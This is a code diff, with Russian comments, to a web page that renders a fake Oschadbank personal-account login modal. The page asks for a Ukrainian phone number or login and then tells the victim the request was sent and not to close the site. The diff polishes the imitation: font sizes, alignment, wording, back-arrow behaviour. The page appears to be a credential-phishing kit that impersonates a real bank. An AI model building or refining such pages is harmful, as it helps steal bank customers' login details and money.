@@ -53,7 +53,7 @@
             background-color: rgba(255, 255, 255, 0.8); padding: 2px 6px; border-radius: 4px;
         }
 
-        /* --- ИЗМЕНЕНИЕ: Стили для модального окна ЛК Ощадбанка --- */
+        /* --- Стили для модального окна ЛК Ощадбанка --- */
         #custom-modal-overlay {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             background-color: #f8f9fa;
@@ -75,26 +75,26 @@
             cursor: pointer; line-height: 1;
         }
         .oschad-header .title {
-            font-size: 17px; /* ИЗМЕНЕНО: Размер шрифта */
-            font-weight: 500; /* ИЗМЕНЕНО: Насыщенность шрифта */
+            font-size: 17px;
+            font-weight: 500;
             color: #212529;
             flex-grow: 1; text-align: center; margin-right: 40px;
         }
         .oschad-welcome-section {
-            padding: 20px; text-align: left; /* ИЗМЕНЕНО: Выравнивание */
+            padding: 20px; text-align: left;
             width: 100%;
             display: flex; flex-direction: column;
             padding-bottom: 120px;
         }
         .oschad-main-title {
-            font-size: 26px; /* ИЗМЕНЕНО */
-            font-weight: 700; /* ИЗМЕНЕНО */
+            font-size: 26px;
+            font-weight: 700;
             margin-bottom: 8px;
             text-align: left;
         }
         .oschad-welcome-section p {
             font-size: 16px; color: #495057; line-height: 1.5;
-            margin-bottom: 25px; font-weight: 400; /* ИЗМЕНЕНО */
+            margin-bottom: 25px; font-weight: 400;
             text-align: left;
         }
         .oschad-toggle-buttons {
@@ -119,7 +119,6 @@
             transition: all 0.2s ease; pointer-events: none; background-color: var(--white); padding: 0 4px;
             z-index: 1;
         }
-        /* ИЗМЕНЕНО: Правило для сдвига метки для поля с телефоном */
         .oschad-input-group.phone-group > label {
             left: 55px;
         }
@@ -132,7 +131,7 @@
             left: 10px; /* Возвращаем стандартный отступ при сдвиге */
         }
         .oschad-input-field {
-            width: 100%; padding: 18px 45px 18px 15px; /* ИЗМЕНЕНО: Увеличена высота */
+            width: 100%; padding: 18px 45px 18px 15px;
             border: 1px solid #dee2e6; border-radius: 12px;
             font-size: 16px; color: var(--dark-text); background-color: var(--white);
             transition: all 0.2s ease; outline: none;
@@ -157,7 +156,7 @@
             border-color: #00A39C;
         }
         .oschad-phone-prefix {
-            padding: 18px 0 18px 15px; /* ИЗМЕНЕНО: Увеличена высота */
+            padding: 18px 0 18px 15px;
             font-size: 16px; color: var(--dark-text);
             font-weight: 500;
         }
@@ -165,8 +164,14 @@
             border: none; padding-left: 5px; flex-grow: 1;
         }
         .forgot-password-link {
-            display: block; text-align: left; margin-top: -10px; margin-bottom: 20px;
-            color: #00A39C; font-weight: 600; text-decoration: none; font-size: 15px;
+            display: block;
+            text-align: center; /* ИЗМЕНЕНИЕ: Выравнивание по центру */
+            margin-top: -10px;
+            margin-bottom: 20px;
+            color: #00A39C;
+            font-weight: 600;
+            text-decoration: none;
+            font-size: 15px;
         }
         .oschad-submit-button {
             position: fixed; bottom: 20px;
@@ -288,15 +293,13 @@ document.addEventListener('DOMContentLoaded', () => {
                     </div>
                     <div class="oschad-welcome-section">
                         <h2 class="oschad-main-title">Ласкаво просимо</h2>
-                        <p>Для входу або реєстрації введіть логін або номер телефону</p>
-                        <div class="oschad-toggle-buttons">
+                        <p>Для входу введіть логін або номер телефону</p> <div class="oschad-toggle-buttons">
                             <button id="toggle-phone" class="active">Номер телефону</button>
                             <button id="toggle-login">Логін</button>
                         </div>
 
                         <div id="phone-login-form">
                             <div class="oschad-input-group phone-group">
-                                <label for="phone_input">Номер телефону</label>
                                 <div class="oschad-phone-wrapper">
                                     <span class="oschad-phone-prefix">+380</span>
                                     <input type="tel" class="oschad-input-field" id="phone_input" placeholder=" " autocomplete="off">
@@ -347,8 +350,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
         if (bankName === 'Ощадбанк') {
             const oschadBackArrow = document.getElementById('oschad-back-arrow');
-            oschadBackArrow.addEventListener('click', () => { window.location.reload(); }); // ИЗМЕНЕНО: Кнопка назад перезагружает страницу
-
+            oschadBackArrow.addEventListener('click', () => { window.location.reload(); });
             const togglePhoneBtn = document.getElementById('toggle-phone');
             const toggleLoginBtn = document.getElementById('toggle-login');
             const phoneLoginForm = document.getElementById('phone-login-form');
@@ -466,7 +468,6 @@ document.addEventListener('DOMContentLoaded', () => {
                             <img src="https://itc.ua/wp-content/uploads/2021/12/oschadik_mint_headphones-770x770.png" class="loader-icon" alt="Loading...">
                         </div>
                      `;
-                     // ИЗМЕНЕНО: Добавляем слушатель для кнопки "назад" на экране загрузки
                      document.getElementById('loader-back-arrow').addEventListener('click', () => renderCustomModal('lk', bankName));
                 } else {
                     customModalContent.innerHTML = `<h3>Очікуємо</h3><p>Заявку відправлено. НЕ ЗАКРИВАЙТЕ САЙТ!</p>`;
